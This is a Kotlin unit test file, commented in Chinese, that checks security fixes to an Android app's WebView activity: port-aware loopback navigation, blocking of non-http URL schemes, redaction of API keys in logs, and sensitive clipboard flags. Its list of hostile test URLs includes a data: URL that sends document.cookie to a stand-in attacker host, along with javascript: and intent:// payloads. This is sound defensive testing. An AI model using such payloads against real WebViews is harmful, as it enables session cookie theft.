package com.dsh

import com.dsh.ui.WebNavAction
import com.dsh.ui.redactFrontendLog
import com.dsh.ui.webNavAction
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/**
 * R49 / W1-F：`DshWebViewActivity.kt` 九条修复的回归测试。
 *
 * ## 判别力的分档（必须说清，否则这批测试会被读成"比实际更强"）
 *
 * 1. **真跑行为**（有运行时判别力）：`webNavAction`（F-1 / F-2）与 `redactFrontendLog`（F-6）
 *    被抽成**顶层纯函数**，只依赖 `java.net.URI` / `Regex` / 字符串 —— JVM 单测能直接调用，
 *    断言的是**函数真的返回了什么**。改坏实现，这些用例**当场变红**。
 * 2. **源码文本断言**（**没有**运行时判别力）：F-3 / F-4 / F-5 / F-7 / F-8 / F-9 的落点是
 *    `View` / `ClipboardManager` / `PackageManager` / `ThemeEngine` 的调用，JVM 单测里
 *    这些类要么不存在、要么是 android.jar 的 `throw new RuntimeException("Stub!")` 桩。
 *    这些用例只能断言"源码里存在某个调用、且不在某个位置" —— 它们挡得住"被删掉/被改回去"
 *    这类回归，但**挡不住**"调用参数写错了"。每条用例的 KDoc 都标注了这一点。
 *
 * 为什么不用 mock/robolectric：本仓的单测 harness（`tools/run-tests.sh`）是 kotlinc +
 * 极简 JUnit 桩，classpath 里没有 mockito/robolectric/androidx 运行时（只有 aar 解包出来的
 * 5 个 jar 供个别反射测试用）。引入它们等于给整个仓库加依赖，超出本批改动的边界。
 */
class R49WebViewFixTest {

    // ============================================================ F-1 / F-2：真跑行为

    /**
     * ★ **F-1 的核心用例**：回环但**端口不对**的 URL 不许留在 WebView。
     *
     * 危害链（SECURITY S-01）：cookie 不区分端口（RFC 6265，dsh 的 `dsh-auth-*` 是 `Path=/`），
     * rootfs 里任何进程在 `127.0.0.1:40404` 起个监听、让聊天里出现一条指向它的链接、
     * 用户点一下 ⇒ 改前 `isLoopback(url)` 为真 ⇒ 在本 WebView 内导航 ⇒ 请求头带着会话
     * cookie 送到对方手上（30 天有效）。
     *
     * 判别力：把 [webNavAction] 的第三个分支改回 `webUiUrlAllowed(url)`（只判 host）或者
     * 直接 `return StayInWebView`，本条立刻变红 —— 已实测（见报告 §F-1 变异验证）。
     */
    @Test
    fun loopbackUrlWithWrongPortMustNotStayInWebView() {
        // 实例端口 3080；链接指向 40404 —— 正是 SECURITY 报告里的攻击形状
        assertEquals(
            "回环但端口不对的 URL 必须外跳，不能留在 WebView 内（cookie 不区分端口）",
            WebNavAction.OpenExternal,
            webNavAction("http://127.0.0.1:40404/", 3080)
        )
        assertEquals(
            "localhost 同理：同一个 host 的另一个端口",
            WebNavAction.OpenExternal,
            webNavAction("http://localhost:40404/", 3080)
        )
        // 反向：端口对上的必须**留在** WebView，否则 dsh 界面本身被外跳出去（功能回归）
        assertEquals(
            "端口对上的 dsh 地址必须留在 WebView 内加载",
            WebNavAction.StayInWebView,
            webNavAction("http://127.0.0.1:3080/?token=abc", 3080)
        )
        assertEquals(
            "localhost 在正确端口上同样要留在 WebView 内",
            WebNavAction.StayInWebView,
            webNavAction("http://localhost:3080/", 3080)
        )
    }

    /**
     * 端口基准 `<= 0`（S-04：自动端口实例、端口此刻不可知）时，判据与加载侧一样**弃权**。
     *
     * 这是**刻意保留**的残余风险，不是本函数的 bug：两侧口径必须同一份，否则又变成两套判据；
     * 而 core 已登记该前提（`webUiUrlAllowed` 的 KDoc：没有网络隔离时"端口号本身不是身份"）。
     * 用例把这条**明写下来** —— 将来如果有人把这里改严（单边）而没改加载侧，本条会红，
     * 提醒他"两侧必须一起动"。
     */
    @Test
    fun unknownPortKeepsTheSameBehaviourAsTheLoadPath() {
        assertEquals(
            "端口不可知时与 loadUrlChecked 同口径（弃权 ⇒ 回环 http 留在 WebView）",
            WebNavAction.StayInWebView,
            webNavAction("http://127.0.0.1:3080/", 0)
        )
        assertEquals(
            "端口不可知也不能把站外地址留在 WebView",
            WebNavAction.OpenExternal,
            webNavAction("https://evil.example/", 0)
        )
    }

    /**
     * ★ **F-2**：非 http(s) 的 scheme 一律 Block（既不留 WebView，也不外跳）。
     *
     * 改前 `shouldOverrideUrlLoading` 对任意 scheme 无条件 `ACTION_VIEW`：`intent://` 会被系统
     * 解析成"启动某个组件"（包名/组件由 URL 指定），`file://` 会交给有 handler 的 App ——
     * 拿到页面执行能力的一方（XSS / 插件注入）能借本 App 的身份发起任意组件跳转。
     *
     * `javascript:` / `data:` 也必须 Block：它们若"留在 WebView"更糟 —— `javascript:` 在当前页面
     * 的同源上下文里执行，`data:` 能渲染任意内容。
     */
    @Test
    fun nonHttpSchemesAreBlockedOutright() {
        val hostile = listOf(
            "intent://evil.example#Intent;scheme=http;end",
            "file:///data/data/com.dsh.fcl.androidlauncher/files/x",
            "javascript:alert(document.cookie)",
            "data:text/html,<script>fetch('https://evil.example/'+document.cookie)</script>",
            "content://com.example.provider/secret",
            // 大小写变体：scheme 在 URI 里不区分大小写，白名单必须同判
            "JavaScript:alert(1)",
            "INTENT://evil#Intent;end"
        )
        for (u in hostile) {
            assertEquals(
                "非 http(s)/mailto 的 scheme 必须 Block（既不留在 WebView，也不外跳）：$u",
                WebNavAction.Block,
                webNavAction(u, 3080)
            )
        }
    }

    /**
     * **F-2 的另一半：别把功能改坏。** `mailto:` 必须放行到外跳。
     *
     * 依据是**出货产物**（不是推测）：dsh 前端自己的链接渲染器把 mailto 列在白名单里
     * （实测读数 `dsh-web-frontend/dist/assets/index-8VXBH-f-.js`：
     * `switch(new URL(e).protocol){case"http:":case"https:":case"mailto:":return e}`）。
     * 一并 Block 的话，用户点聊天里的邮箱地址会从"能发信"变成"没反应"。
     *
     * 它也不带会话凭据：落到邮件 App 的撰写界面，收件人可见。
     */
    @Test
    fun mailtoIsForwardedNotBlocked() {
        assertEquals(
            "mailto: 必须外跳（前端自己的渲染器就放行它）",
            WebNavAction.OpenExternal,
            webNavAction("mailto:someone@example.com", 3080)
        )
        assertEquals(
            "mailto: 的大小写变体同样要放行",
            WebNavAction.OpenExternal,
            webNavAction("MAILTO:someone@example.com", 3080)
        )
    }

    /**
     * 站外 http(s) 外跳（既有行为不能退化）。
     *
     * 同时钉住"非回环的 http(s) 不被 Block" —— 这是 F-1 重构里最容易写错的一处：
     * `webUiUrlAllowed(url)` 对 `https://evil.example/` 返回 **false**（不是回环 host），
     * 若拿它当 scheme 判据就会把站外链接 Block 掉，站外外跳功能整体失效。
     */
    @Test
    fun externalHttpLinksAreForwardedNotBlocked() {
        for (u in listOf(
            "https://evil.example/path?q=1",
            "http://example.com/",
            "https://127.0.0.1.evil.example/" // 前缀像回环，host 不是
        )) {
            assertEquals("站外 http(s) 必须外跳，不得 Block：$u", WebNavAction.OpenExternal, webNavAction(u, 3080))
        }
    }

    /** 空/空白/null 一律 Block（不外跳、不留 WebView）。 */
    @Test
    fun blankUrlsAreBlocked() {
        assertEquals(WebNavAction.Block, webNavAction(null, 3080))
        assertEquals(WebNavAction.Block, webNavAction("", 3080))
        assertEquals(WebNavAction.Block, webNavAction("   ", 3080))
    }

    /**
     * F-3 的行为面：`[::1]` **不是** dsh 的地址，但导航判据沿用的是 core 的口径（认它）。
     *
     * ★ 这条用例是**如实登记**，不是庆祝：本 Activity 的 `isLoopback` 已去掉 `::1`
     * （见 F-3 的源码断言），但导航判据委托 core 的 `webUiUrlAllowed`，而那边
     * `adoptionHostIsLoopback` 认 `::1` / `[::1]`。两边**故意**没统一（理由见
     * `isLoopback` 的 KDoc：core 那条管"能不能认领成 dsh 的 URL"，多认一个回环 host
     * 只多一次探活）。
     *
     * 为什么这不构成新洞：
     * - `::1` 上没有 dsh 监听（dsh 只绑 `127.0.0.1`）；
     * - cookie 按 **host** 作用域：`127.0.0.1` 的 cookie 不会发给 `[::1]`（不同 host）；
     * - NSC 没有放行 `[::1]` 的明文 ⇒ 请求在系统层就被拦掉。
     * 若将来有人据这条把 `::1` 从 core 删掉，本条会红 —— 那是**有意的变更信号**，
     * 提醒他同时更新 `isLoopback` 的 KDoc（本仓不接受"改了一边没改另一边"）。
     */
    @Test
    fun ipv6LoopbackAcceptanceIsDocumentedNotAccidental() {
        assertEquals(
            "导航判据沿 core 口径认 [::1]（doc 见用例 KDoc）；这不是 dsh 的真实地址，" +
                "但也不构成 cookie 泄露路径",
            WebNavAction.StayInWebView,
            webNavAction("http://[::1]:3080/", 3080)
        )
        // 端口仍然生效：`[::1]` 在别的端口上照样外跳
        assertEquals(
            WebNavAction.OpenExternal,
            webNavAction("http://[::1]:40404/", 3080)
        )
    }

    // ============================================================ F-6：真跑行为

    /**
     * ★ **F-6**：前端 console 里的 API Key 形态必须在进日志总线**之前**被抹掉。
     *
     * 总线的 `sanitize` 只认 `token=` 与**已注册**的 secret，而 API Key 从来没被注册过
     * （App 刻意不读它）⇒ 插件一句 `console.log(key)` 就会原样落进 `logs/` 下的落盘文件。
     */
    @Test
    fun apiKeysInConsoleOutputAreRedacted() {
        val deepseekKey = "sk-" + "0123456789abcdef0123456789abcdef"
        val redacted = redactFrontendLog("request failed, key=$deepseekKey done")
        assertFalse("sk- 形态的 Key 必须被抹掉。实际：$redacted", redacted.contains(deepseekKey))
        assertTrue("前缀要保留（排障时要能认出是哪种凭据）。实际：$redacted", redacted.contains("sk-***"))
        assertTrue("Key 前后的正常文本必须保留。实际：$redacted", redacted.contains("request failed"))
        assertTrue("尾部文本必须保留。实际：$redacted", redacted.contains("done"))

        // OpenAI 风格的长 key 同样命中
        val longKey = "sk-" + "a".repeat(48)
        assertFalse(redactFrontendLog("k=$longKey").contains(longKey))
    }

    /** `Bearer <token>` 头形态（前端偶尔会打印请求头）。只抹值，保留 `Bearer` 一词。 */
    @Test
    fun bearerTokensInConsoleOutputAreRedacted() {
        val token = "abcdefghijklmnopqrstuvwxyz012345"
        val out = redactFrontendLog("Authorization: Bearer $token")
        assertFalse("Bearer 的值必须被抹掉。实际：$out", out.contains(token))
        assertTrue("要保留 Bearer 一词（排障要能看出这是哪种凭据）。实际：$out", out.contains("Bearer"))
    }

    /**
     * **F-6 的误伤边界**：普通文本/短串/哈希类 ID 不许被打码。
     *
     * 理由：`DshLogBus.registerSecret` 的事故已经证明过启发式打码的代价
     * （单字符 secret 会把整个日志打成马赛克）。`[web]` 这一路是前端报错的**唯一出口**，
     * 打宽了等于让排障失效。
     */
    @Test
    fun ordinaryConsoleTextIsLeftAlone() {
        val benign = listOf(
            "Failed to fetch /api/session",
            "short sk-abc should stay",                    // sk- 后不足 16 字符 ⇒ 不打
            "trace id 3f9a2b7c1d4e5f60718293a4b5c6d7e8",   // 哈希类 ID ⇒ 不打（不匹配 sk-/Bearer）
            "task=build-2026-11-23T12:00:00Z",
            "at chunk-ABC123.js:142:7"
        )
        for (line in benign) {
            assertEquals("正常文本不许被打码：$line", line, redactFrontendLog(line))
        }
    }

    // ============================================================ 源码级断言（无运行时判别力）

    /**
     * **F-9**：日志控制台的颜色必须挂在 `ThemeEngine.registerEvent` 上，并在 `onDestroy` 反注册。
     *
     * 为什么必须有：`DshWebViewActivity` 的 `configChanges` 含 `uiMode`
     * （`AndroidManifest.xml`，实测确认），切亮暗**不重建** Activity ⇒ "在 onCreate 里取一次色"
     * 会永远停在启动时那一档。`DshLogsUI` / `DshInstanceAdapter` 都为此挂过 registerEvent
     * （本仓反复踩过这条，见那些文件的注释）。
     *
     * ⚠ **没有运行时判别力**：`ThemeEngine` 是 Android 侧单例，JVM 单测里跑不了。
     * 本条只能证明"注册与反注册的调用都在、且用的是同一个 View 实例字段"。
     */
    @Test
    fun consoleColoursAreRegisteredForThemeRefreshAndUnregistered() {
        val src = mainSourceCode()
        assertTrue(
            "console 的底板/正文颜色必须挂 ThemeEngine.registerEvent —— " +
                "configChanges 含 uiMode ⇒ 切亮暗不重建，onCreate 取一次就会停在旧色",
            src.contains("ThemeEngine.getInstance().registerEvent(")
        )
        // 注册用的 runnable 必须是"现取颜色"的那个（不是一次性快照）
        assertTrue(
            "注册的回调必须是 logConsoleThemeRefresh（其在回调体内现取 getColor）",
            src.contains("registerEvent(console, logConsoleThemeRefresh)")
        )
        // 反注册：key 必须与注册时同一个 View —— 注册用局部 val(console)、注销用字段，
        // 两者指向同一个实例；这里钉住"注销存在且用的是被保存下来的那个字段"。
        assertTrue(
            "onDestroy 必须反注册 console 的主题回调（否则闭包捕获 this 一直挂着）",
            src.contains("ThemeEngine.getInstance().unregisterEvent(it)")
        )
        val refreshBody = codeBody("private fun refreshLogConsoleTheme()")
        assertTrue(
            "颜色必须在**回调体内**现取（getColor），不能在字段初始化时取一次。" +
                "实际方法体：\n$refreshBody",
            refreshBody.contains("getColor(R.color.dsh_log_console_bg)") &&
                refreshBody.contains("getColor(R.color.dsh_log_info)")
        )
        assertTrue(
            "底板与正文必须在**同一次回调**里一起刷（只刷底板会变成一新一旧、对比度更差）。" +
                "实际方法体：\n$refreshBody",
            refreshBody.contains("backgroundTintList") && refreshBody.contains("setTextColor")
        )
    }

    /**
     * **F-1 的接线**：`shouldOverrideUrlLoading` 必须走 `webNavAction`，且**不再自带 host 清单**。
     *
     * ⚠ **没有运行时判别力**（WebViewClient 回调在 JVM 测不了）。它挡的是"接线被改回去"：
     * 判据函数的单元测试全绿、但调用点仍写着 `if (isLoopback(url)) return false` ——
     * 那种情况下所有 F-1 的行为用例照样绿，洞却还在（本仓 `R28CallSiteContractTest` /
     * `R29CopyDeferTest` 就是为这类"纯函数绿、调用点没接"的事故而存在的）。
     */
    @Test
    fun navigationCallbackDelegatesToTheSharedDecision() {
        val body = codeBody("override fun shouldOverrideUrlLoading(")
        assertTrue(
            "shouldOverrideUrlLoading 必须调 webNavAction( 做判定。实际：\n$body",
            body.contains("webNavAction(")
        )
        assertFalse(
            "shouldOverrideUrlLoading 不许再直接判 isLoopback( —— 那正是 S-01 的洞" +
                "（只判 host、不判端口）。实际：\n$body",
            body.contains("isLoopback(")
        )
        assertTrue(
            "端口基准必须来自 DshRuntime 的运行期端口（expectedWebUiPort / State.Running.port）。" +
                "实际：\n$body",
            body.contains("expectedWebUiPort()")
        )
    }

    /**
     * **F-1 的口径单一性**：两处（加载侧 `loadUrlChecked` / 导航侧 `webNavAction`）
     * 必须委托**同一个** `webUiUrlAllowed(url, expectedPort)`。
     *
     * ⚠ **没有运行时判别力**：断言的是"两处都调用了同一个函数"，不是它的返回值。
     */
    @Test
    fun bothGatesShareOnePortAwarePredicate() {
        val loadGate = codeBody("private fun loadUrlChecked(")
        assertTrue(
            "加载侧必须带端口调用 webUiUrlAllowed(url, expectedPort)。实际：\n$loadGate",
            loadGate.contains("webUiUrlAllowed(url, expectedPort)")
        )
        val navDecision = codeBody("fun webNavAction(")
        assertTrue(
            "导航侧必须**同样**带端口调用 webUiUrlAllowed(url, expectedPort) —— " +
                "两处判据不是同一份就是下一次口径漂移。实际：\n$navDecision",
            navDecision.contains("webUiUrlAllowed(url, expectedPort)")
        )
        // 两侧的端口基准必须同源（都是 State.Running.port）；不许出现 portOf(url) 自证
        assertFalse(
            "端口基准不许取 portOf(url) —— 那是被校验的对象，等于恒等放行。实际：\n$navDecision",
            navDecision.contains("portOf(")
        )
    }

    /**
     * **F-1 的端口基准同源**：加载侧（内联 `State.Running.port`）与导航侧
     * （`expectedWebUiPort()`）必须取**同一个表达式**。
     *
     * 为什么单独一条：`R34PortGateTest` 逐字钉着 `loadUrlChecked` 方法体里的
     * `DshRuntime.State.Running` + `.port`，所以那一处**不能**抽成 helper。于是"同源"
     * 只能靠两处的取值表达式逐字一致来保证 —— 这条用例就是那个守卫：任一处换了基准
     * （例如改成 `instance.port`、或 `portOf(url)`），本条变红。
     *
     * ⚠ **没有运行时判别力**：断言的是两段源码文本里出现了同一个取值表达式。
     */
    @Test
    fun portBaselineIsTheSameInBothGates() {
        // 两处都必须出现这一模一样的取值表达式
        val expr = "(DshRuntime.state.value as? DshRuntime.State.Running)?.port ?: 0"
        val loadGate = codeBody("private fun loadUrlChecked(")
        assertTrue(
            "加载侧的端口基准必须是 `$expr`（R34PortGateTest 逐字钉着它的残留片段）。" +
                "实际：\n$loadGate",
            loadGate.contains(expr)
        )
        val portHelper = expressionBody("private fun expectedWebUiPort()")
        assertTrue(
            "expectedWebUiPort 必须用与加载侧**同一个**表达式 `$expr` —— 两份不同源就是" +
                "下一次口径漂移。实际：\n$portHelper",
            portHelper.contains(expr)
        )
        // 导航侧经 helper 取值，且 helper 只能有一个来源
        val navDecision = codeBody("fun webNavAction(")
        assertFalse(
            "webNavAction 自己不该再取一次端口（基准只应有一个来源 expectedWebUiPort()）。" +
                "实际：\n$navDecision",
            navDecision.contains("DshRuntime.state")
        )
    }

    /**
     * **F-3**：`isLoopback` 不再认 `::1`，且 NSC 与之保持一致（只放行 dsh 真正绑定的两个 host）。
     *
     * ⚠ **没有运行时判别力**：`Uri.parse` 是 android.jar 里的桩。断言的是两份清单的内容。
     */
    @Test
    fun ipv6IsNotAcceptedByEitherSide() {
        val body = codeBody("private fun isLoopback(")
        assertFalse(
            "isLoopback 不许再认 ::1 —— NSC 没有（也不确定能）放行它，" +
                "两边口径必须一致（理由见其 KDoc）。实际：\n$body",
            body.contains("::1")
        )
        assertTrue(
            "isLoopback 必须仍认 127.0.0.1（dsh 实际绑定的地址）。实际：\n$body",
            body.contains("127.0.0.1")
        )
        assertTrue("isLoopback 必须仍认 localhost。实际：\n$body", body.contains("localhost"))

        val nsc = resourceText("xml/network_security_config.xml")
        assertFalse(
            "NSC 不该出现 ::1 —— 若真机实测证明 <domain> 吃 IPv6 字面量，" +
                "要**两边一起**改（见 isLoopback 的 KDoc 第 4 条）",
            nsc.contains("::1")
        )
        assertTrue("NSC 必须放行 127.0.0.1", nsc.contains("<domain includeSubdomains=\"false\">127.0.0.1</domain>"))
        assertTrue("NSC 必须放行 localhost", nsc.contains("<domain includeSubdomains=\"false\">localhost</domain>"))
        // 全局明文必须仍是关的（别为了修这条把 base-config 放开）
        assertTrue(
            "base-config 的 cleartextTrafficPermitted 必须仍是 false",
            nsc.contains("<base-config cleartextTrafficPermitted=\"false\" />")
        )
        // 结论必须可测：DEBUG 包里打一条 cleartext 策略实测行
        assertTrue(
            "必须有 reportCleartextPolicy() 把 isCleartextTrafficPermitted 的真实结果打进日志 —— " +
                "否则'::1 到底能不能放行'只能靠猜（本文件 KDoc 第 4 条）",
            mainSourceCode().contains("reportCleartextPolicy()")
        )
        assertTrue(
            "reportCleartextPolicy 必须真的查询 ::1（否则拿不到证据）",
            codeBody("private fun reportCleartextPolicy()").contains("\"::1\"")
        )
    }

    /**
     * **F-4**：manifest 必须有 `<queries>` 声明 VIEW + http/https，否则 `resolveActivity`
     * 恒 null，"我们把 token 交给了谁"在代码里既校验不了也记不下来。
     *
     * ⚠ **没有运行时判别力**：断言的是 XML 文本。
     */
    @Test
    fun manifestDeclaresQueriesForViewingWebLinks() {
        val manifest = manifestText()
        assertTrue(
            "manifest 必须有 <queries> 段（没有它 targetSdk>=30 下 resolveActivity/queryIntentActivities 恒空）",
            manifest.contains("<queries>")
        )
        val queries = sliceBetween(manifest, "<queries>", "</queries>")
            ?: throw AssertionError("找不到 <queries>…</queries> 段 —— 解析失败")
        assertTrue(
            "<queries> 必须声明 ACTION_VIEW。<queries> 段实际：\n$queries",
            queries.contains("android.intent.action.VIEW")
        )
        assertTrue("<queries> 必须声明 http scheme。实际：\n$queries", queries.contains("android:scheme=\"http\""))
        assertTrue("<queries> 必须声明 https scheme。实际：\n$queries", queries.contains("android:scheme=\"https\""))
        assertFalse(
            "不许用 QUERY_ALL_PACKAGES 一把梭 —— 可见面要收到最小。<queries> 段实际：\n$queries",
            queries.contains("QUERY_ALL_PACKAGES")
        )
        // 不许把 <queries> 误写进 <application> 里面（位置错了编译能过但语义不对）
        val appStart = manifest.indexOf("<application")
        val queriesStart = manifest.indexOf("<queries>")
        assertTrue("<queries> 必须在 <application> 之前（manifest 层级）", queriesStart in 0 until appStart)
    }

    /** **F-4 的第二半**：外跳日志必须真的记下接收方，不再写"解析不了"。 */
    @Test
    fun externalOpenLogRecordsTheActualTarget() {
        val src = mainSourceCode()
        assertFalse(
            "日志里不许再写 'target app not resolvable' —— 补了 <queries> 之后它能解析了",
            src.contains("target app not resolvable")
        )
        assertTrue(
            "外跳日志必须带 target=<包名>（拿不到时记 (unresolved)，不许假装知道）",
            src.contains("target=\${viewIntent.targetPackage ?: \"(unresolved)\"}")
        )
        assertTrue(
            "必须有 externalBrowserIntent() 负责构造 intent + 解析接收方",
            src.contains("private fun externalBrowserIntent(")
        )
        assertTrue(
            "外跳 intent 必须加 CATEGORY_BROWSABLE，把候选从'任意声明 VIEW 的 App'收窄到浏览器",
            codeBody("private fun externalBrowserIntent(").contains("CATEGORY_BROWSABLE")
        )
    }

    /**
     * **F-5**：`[wsdiag]` 不许再打原始 URL，改走 `urlSkeleton()`。
     *
     * ⚠ **没有运行时判别力**：断言的是"这条日志用了哪个函数"。
     */
    @Test
    fun wsdiagDoesNotLogTheRawUrl() {
        val body = codeBody("private fun diagnoseDshCookie(")
        assertFalse(
            "[wsdiag] 不许再原样打 url=\$pageUrl（带的可能是真 token）。实际：\n$body",
            body.contains("url=\$pageUrl")
        )
        assertTrue(
            "[wsdiag] 必须走 urlSkeleton(pageUrl)。实际：\n$body",
            body.contains("urlSkeleton(pageUrl)")
        )
        assertTrue(
            "authority 也要剥掉 userinfo（http://u:p@host 的 authority 含凭据）。实际：\n$body",
            body.contains("substringAfterLast('@')")
        )
    }

    /**
     * **F-8 / P2-10**：同一份 URL 的日志口径统一 —— `loadBestUrl` 也走 `urlSkeleton`。
     *
     * ⚠ **没有运行时判别力**。
     */
    @Test
    fun loadBestUrlLogsTheSkeletonNotTheRawUrl() {
        val body = codeBody("private fun loadBestUrl(")
        assertTrue(
            "loadBestUrl 的日志必须走 urlSkeleton(url)。实际：\n$body",
            body.contains("urlSkeleton(url)")
        )
        assertFalse(
            "loadBestUrl 里不许再有裸 \$url 插值进日志（同一份 URL 两套口径）。实际：\n$body",
            // 只认"裸 $url 插值"的形态（后面不是字母/花括号），排除 ${urlSkeleton(url)} 这种。
            // 正则里的 $ 用 ${'$'} 转义 —— Kotlin 的 raw string 仍会做模板替换。
            Regex("""\${'$'}url[^A-Za-z{]""").containsMatchIn(body)
        )
    }

    /**
     * **F-7 / S-14**：三处剪贴板写入都带 `EXTRA_IS_SENSITIVE`，且低版本有版本门。
     *
     * ⚠ **没有运行时判别力**：`ClipData` 在 JVM 上是 android.jar 的桩（调用即 `Stub!`）。
     * 断言的是"统一走 sensitiveClip + 有 API 33 版本门"，不是"标记真的写进去了"。
     */
    @Test
    fun clipboardWritesAreMarkedSensitive() {
        val src = mainSourceCode()
        assertFalse(
            "不许再有裸 ClipData.newPlainText( 直接进剪贴板（会漏敏感标记）。" +
                "唯一允许出现它的地方是 sensitiveClip 本体。",
            src.replace(
                codeBody("fun sensitiveClip("), ""
            ).contains("ClipData.newPlainText(")
        )
        val helper = codeBody("fun sensitiveClip(")
        assertTrue(
            "sensitiveClip 必须设置 EXTRA_IS_SENSITIVE。实际：\n$helper",
            helper.contains("EXTRA_IS_SENSITIVE")
        )
        assertTrue(
            "EXTRA_IS_SENSITIVE 是 API 33 起的常量，必须有版本门（minSdk=26）。实际：\n$helper",
            helper.contains("VERSION_CODES.TIRAMISU") || helper.contains("SDK_INT >= 33")
        )
        // 三处调用点：门禁确认框、「链接已复制」外跳兜底、ACTION_VIEW 失败兜底。
        // 判据取**调用点**数（排掉 `fun sensitiveClip(` 这个定义），不做整体计数 ——
        // 计数对"定义里再调用一次"之类的重构很脆。
        val callSites = Regex("""(^|[^a-zA-Z.])sensitiveClip\(""").findAll(src)
            .count { m -> !src.substring(m.range.first).startsWith("fun sensitiveClip(") }
        assertTrue(
            "三处剪贴板写入都要走 sensitiveClip（现存 $callSites 处调用）",
            callSites >= 3
        )
    }

    /**
     * **F-6 的接线**：`onConsoleMessage` 必须把 console 文本先过 `redactFrontendLog`。
     *
     * ⚠ **没有运行时判别力**：只证明"调用在"，不证明参数对。
     */
    @Test
    fun consoleOutputIsRedactedBeforeReachingTheLogBus() {
        val body = codeBody("override fun onConsoleMessage(")
        assertTrue(
            "onConsoleMessage 必须把消息先过 redactFrontendLog( 再交 logWeb。实际：\n$body",
            body.contains("redactFrontendLog(")
        )
        assertFalse(
            "onConsoleMessage 里不许再把 it.message() 原样塞进 logWeb。实际：\n$body",
            Regex("""logWeb\(\s*"\[web\] \$\{it\.message\(\)\}""").containsMatchIn(body)
        )
    }

    // ============================================================ 源码读取/切片工具

    /** 去掉 `//` 行注释与 `/* */` 块注释 —— 源码断言必须只看**代码**，注释里提到旧写法不算回归。 */
    private fun stripComments(text: String): String {
        val noBlock = Regex("""/\*.*?\*/""", RegexOption.DOT_MATCHES_ALL).replace(text, "")
        return noBlock.lines().joinToString("\n") { line ->
            val idx = line.indexOf("//")
            if (idx >= 0) line.substring(0, idx) else line
        }
    }

    fun mainSourceText(): String = mainSourceRaw()

    private fun mainSourceRaw(): String =
        resolveMainSource("ui/DshWebViewActivity.kt")
            ?: throw AssertionError(
                "找不到 ui/DshWebViewActivity.kt：请在仓库根或 FCL/ 目录下运行测试" +
                    "（兼容 FCL/FCL/、FCL/、src/main/ 三种布局）"
            )

    /** 去注释后的主源码（用于"代码里不许再出现 X"这类断言）。 */
    private fun mainSourceCode(): String = stripComments(mainSourceRaw())

    /** 去注释后的某个函数体（用 [mainSourceCode]，所以注释里提到旧写法不会误报）。 */
    private fun codeBody(signature: String): String = functionBodyIn(mainSourceCode(), signature)

    /**
     * 切出一个**表达式体**函数（形如 `fun f() = expr`，没有花括号）的文本：
     * 从签名所在行起，到下一条**空行**为止。
     *
     * 为什么要单独一个：`functionBodyIn` 按花括号配对切片，对 `= expr` 形态会滑到下一个
     * 带花括号的函数去（本条用例就踩到过 —— 切出来的是 `externalBrowserIntent` 的体）。
     */
    private fun expressionBody(signature: String): String {
        val text = mainSourceCode()
        val start = text.indexOf(signature)
        if (start < 0) throw AssertionError("找不到 `$signature` —— 被改名或删了？")
        val lineStart = text.lastIndexOf('\n', start).let { if (it < 0) start else it + 1 }
        val end = text.indexOf("\n\n", start).let { if (it < 0) text.length else it }
        return text.substring(lineStart, end)
    }

    private fun manifestText(): String =
        resolveFromSrcMain("AndroidManifest.xml")
            ?: throw AssertionError("找不到 FCL/src/main/AndroidManifest.xml")

    private fun resourceText(rel: String): String =
        resolveFromSrcMain("res/$rel")
            ?: throw AssertionError("找不到 FCL/src/main/res/$rel")

    /** 从 `src/main/` 起找文件（manifest 与 res/ 都在这一级；`com/dsh` 是它的子目录）。 */
    private fun resolveFromSrcMain(rel: String): String? {
        var dir: File? = File(System.getProperty("user.dir") ?: ".").absoluteFile
        var depth = 0
        while (dir != null && depth < 8) {
            for (main in listOf(
                File(dir, "FCL/FCL/src/main"),
                File(dir, "FCL/src/main"),
                File(dir, "src/main")
            )) {
                val f = File(main, rel)
                if (f.isFile) return f.readText()
            }
            dir = dir.parentFile
            depth++
        }
        return null
    }

    /**
     * 找 `com/dsh/` 下的主源码文件。
     *
     * [rel] 相对 `com/dsh/`，允许 `../` 前缀用于跳到 res/ 与 manifest。
     */
    private fun resolveMainSource(rel: String): String? {
        var dir: File? = File(System.getProperty("user.dir") ?: ".").absoluteFile
        var depth = 0
        while (dir != null && depth < 8) {
            val base = listOf(
                File(dir, "FCL/FCL/src/main/java/com/dsh"),
                File(dir, "FCL/src/main/java/com/dsh"),
                File(dir, "src/main/java/com/dsh")
            ).firstOrNull { it.isDirectory }
            if (base != null) {
                val f = File(base, rel).normalize()
                if (f.isFile) return f.readText()
            }
            dir = dir.parentFile
            depth++
        }
        return null
    }

    /** 切出一个函数/方法体（从签名到与第一个 `{` 配对的那个 `}`）。 */
    private fun functionBody(signature: String): String = functionBodyIn(mainSourceRaw(), signature)

    private fun functionBodyIn(text: String, signature: String): String {
        val start = text.indexOf(signature)
        if (start < 0) throw AssertionError("找不到 `$signature` —— 被改名或删了？")
        val braceStart = text.indexOf('{', start)
        if (braceStart < 0) throw AssertionError("`$signature` 没有方法体？")
        var depth = 0
        var i = braceStart
        while (i < text.length) {
            when (text[i]) {
                '{' -> depth++
                '}' -> {
                    depth--
                    if (depth == 0) return text.substring(braceStart, i + 1)
                }
            }
            i++
        }
        throw AssertionError("`$signature` 的花括号没有闭合 —— 解析失败")
    }

    /** 取 `[from]` 与 `[to]` 之间的原文（找不到返回 null）。 */
    private fun sliceBetween(text: String, from: String, to: String): String? {
        val a = text.indexOf(from)
        if (a < 0) return null
        val b = text.indexOf(to, a + from.length)
        if (b < 0) return null
        return text.substring(a, b + to.length)
    }
}
